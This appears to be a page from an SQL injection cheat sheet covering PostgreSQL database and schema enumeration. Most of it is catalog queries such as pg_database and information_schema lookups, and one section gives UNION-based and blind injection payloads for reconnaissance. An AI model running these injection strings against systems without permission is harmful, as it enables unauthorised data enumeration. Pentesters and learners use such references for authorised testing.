---
title: Database Names
description: How to retrieve database names in PostgreSQL
category: Information Gathering
order: 6
tags: ["databases", "enumeration", "reconnaissance"]
lastUpdated: 2025-12-16
---

## Retrieving Database Names

PostgreSQL stores database metadata in system catalogs that can be queried to enumerate available databases.

### Current Database

```sql
-- Get current database name
SELECT current_database();

-- Alternative
SELECT current_catalog;
```

### Current Schema

```sql
-- Get current schema (search path)
SELECT current_schema();

-- Get full search path
SELECT current_schemas(true);

-- Show search_path setting
SHOW search_path;
```

### List All Databases

```sql
-- Using pg_database system catalog
SELECT datname FROM pg_database;

-- Exclude template databases
SELECT datname FROM pg_database WHERE datistemplate = false;

-- Get databases as comma-separated list
SELECT string_agg(datname, ',' ORDER BY datname) FROM pg_database;
```

### Database Information

```sql
-- Get database details
SELECT datname, datdba, encoding, datcollate
FROM pg_database;

-- Get database owner name
SELECT d.datname, r.rolname as owner
FROM pg_database d
JOIN pg_roles r ON d.datdba = r.oid;
```

### List Schemas in Current Database

```sql
-- All schemas
SELECT schema_name FROM information_schema.schemata;

-- Using pg_namespace
SELECT nspname FROM pg_namespace;

-- Non-system schemas
SELECT nspname FROM pg_namespace
WHERE nspname NOT LIKE 'pg_%'
AND nspname != 'information_schema';
```

### Injection Examples

```sql
-- UNION-based database enumeration
' UNION SELECT NULL,datname,NULL FROM pg_database--

-- Get current database
' UNION SELECT NULL,current_database(),NULL--

-- List all schemas
' UNION SELECT NULL,string_agg(schema_name,',' ORDER BY schema_name),NULL FROM information_schema.schemata--

-- Blind injection (extract database name character by character)
' AND SUBSTRING(current_database(),1,1)='p'--
```

### Using LIMIT and OFFSET

```sql
-- Get nth database name
SELECT datname FROM pg_database LIMIT 1 OFFSET 0;  -- First
SELECT datname FROM pg_database LIMIT 1 OFFSET 1;  -- Second
SELECT datname FROM pg_database LIMIT 1 OFFSET 2;  -- Third
```

### Notes

- `pg_database` is accessible to all users
- Database enumeration doesn't require special privileges
- The `current_database()` function is always available
- Template databases (`template0`, `template1`) are usually not interesting for attacks
